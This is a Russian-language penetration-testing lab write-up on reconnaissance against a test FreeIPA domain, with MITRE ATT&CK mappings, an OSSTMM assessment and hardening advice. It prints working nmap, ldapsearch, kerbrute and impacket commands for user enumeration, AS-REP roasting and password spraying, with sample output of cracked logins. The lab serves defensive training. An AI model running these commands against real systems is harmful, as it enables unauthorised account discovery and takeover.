# Эксперимент 1. Сбор информации

**Цель:** определить, что видит внешний атакующий — какие сервисы доступны без аутентификации и где проходят границы доверия. Затем перечислить пользователей домена и проверить устойчивость к подбору паролей.

**MITRE ATT&CK:** T1046 (Network Service Discovery), T1087.002 (Account Discovery: Domain Account), T1595 (Active Scanning), T1110.003 (Password Spraying)

**Инструменты:** `nmap`, `dig`, `curl`, `nc`, `ldapsearch`, `kerbrute`, `impacket`

---

## 1.1. Карта сети

```bash
nmap -sV 10.7.7.0/24
```

Фиксируем открытые порты и слушающие их сервисы для каждого хоста сети.

## 1.2. Разведка Kerberos через DNS (SRV-записи)

```bash
dig _kerberos._tcp.test.ru SRV
dig _ldap._tcp.test.ru SRV
```

В ответе видно, на каком узле зарегистрированы сервисы KDC и LDAP.

## 1.3. Проверка порта Kerberos

```bash
nc -vz ipa.test.ru 88
# или
nmap -p 88 ipa.test.ru
```

Подтверждаем, что порт 88 открыт.

## 1.4. Доступ к веб-интерфейсу и LDAP

```bash
curl -I http://ipa.test.ru
curl -I https://ipa.test.ru
curl -I http://web.test.ru
nc -vz ipa.test.ru 389
nc -vz ipa.test.ru 636
```

## 1.5. Анонимный LDAP

```bash
ldapsearch -x -H ldap://ipa.test.ru
```

В базовой конфигурации сервер отдаёт данные **без аутентификации**: структуру домена, версию FreeIPA, контейнеры пользователей и публичную часть CA-сертификата домена. Это ключевое допущение Trust в базовой конфигурации.

## 1.6. Перечисление пользователей (kerbrute)

Скачиваем kerbrute (<https://github.com/ropnop/kerbrute>) на машину `attacker`.

Готовим словарь `users.txt`:

```txt
user1
user2
admin
vkor
test1
test2
testuser
```

Запускаем перечисление:

```bash
./kerbrute_linux_amd64 userenum --dc 10.7.7.1 -d test.ru users.txt -o users_found.txt
```

Параметры:
- `--dc 10.7.7.1` — сервер FreeIPA (KDC)
- `-d test.ru` — домен
- `users.txt` — словарь
- `-o` — файл результата

Пример вывода:

```
2026/04/05 15:26:48 >  Using KDC(s):
2026/04/05 15:26:48 >    10.7.7.1:88
2026/04/05 15:26:48 >  [+] VALID USERNAME:  vkor@test.ru
2026/04/05 15:26:48 >  [+] VALID USERNAME:  admin@test.ru
2026/04/05 15:26:48 >  [+] VALID USERNAME:  test1@test.ru
2026/04/05 15:26:48 >  [+] VALID USERNAME:  test2@test.ru
2026/04/05 15:26:48 >  [+] VALID USERNAME:  testuser@test.ru
2026/04/05 15:26:48 >  Done! Tested 6 usernames (5 valid) in 0.016 seconds
```

KDC по-разному отвечает на существующие и несуществующие принципалы, что и позволяет их различать.

## 1.7. Попытка AS-REP Roasting (impacket)

```bash
impacket-GetNPUsers test.ru/ -usersfile users.txt -dc-ip 10.7.7.1 -format hashcat
```

```
[-] User testuser doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set
...
```

**Вывод:** предварительная аутентификация включена по умолчанию для всех пользователей, поэтому получить хэш для офлайн-перебора не удаётся. AS-REP Roasting в базовой конфигурации FreeIPA не результативен.

## 1.8. Password Spraying

```bash
kerbrute passwordspray -d test.ru users.txt 'P@ssw0rd' --dc 10.7.7.1
```

```
2026/04/05 16:34:57 >  [+] VALID LOGIN:  admin@test.ru:P@ssw0rd
2026/04/05 16:34:57 >  [+] VALID LOGIN:  test1@test.ru:P@ssw0rd
2026/04/05 16:34:57 >  [+] VALID LOGIN:  asrepuser@test.ru:P@ssw0rd
2026/04/05 16:34:57 >  [+] VALID LOGIN:  testuser@test.ru:P@ssw0rd
2026/04/05 16:34:57 >  [+] VALID LOGIN:  test2@test.ru:P@ssw0rd
2026/04/05 16:34:57 >  Done! Tested 7 logins (5 successes) in 0.035 seconds
```

Атака рассчитана на слабые пароли. На практике вместо одного пароля используется подготовленная база. Spraying (один пароль на много учёток) обходит блокировку по числу неудачных попыток для отдельного аккаунта.

## 1.9. Проверка логов на сервере

На `ipa.test.ru`:

```bash
tail -f /var/log/krb5kdc.log
```

Каждая попытка аутентификации фиксируется в журнале KDC — это основа для обнаружения spraying защитником.

---

## Оценка по OSSTMM

| Метрика | Оценка | Обоснование |
|---------|--------|-------------|
| **Visibility** | Высокая | Анонимный LDAP и SRV-записи раскрывают структуру домена и список пользователей; spraying при этом виден в `krb5kdc.log`. |
| **Access** | Низкий барьер | Достаточно сетевой видимости KDC (порт 88) и LDAP — локальный доступ не требуется. |
| **Trust** | Высокий | Анонимные LDAP-запросы обслуживаются без проверки подлинности; KDC раскрывает факт существования принципала. |

## Рекомендации по hardening

- Запретить анонимный bind в 389 DS (`nsslapd-allow-anonymous-access: off`).
- Усилить парольную политику: `ipa pwpolicy-mod` (минимальная длина, классы символов, история, блокировка). Проверить текущую: `ipa pwpolicy-show`.
- Настроить мониторинг и алерты по аномалиям в `krb5kdc.log` (всплеск AS-REQ от одного источника).
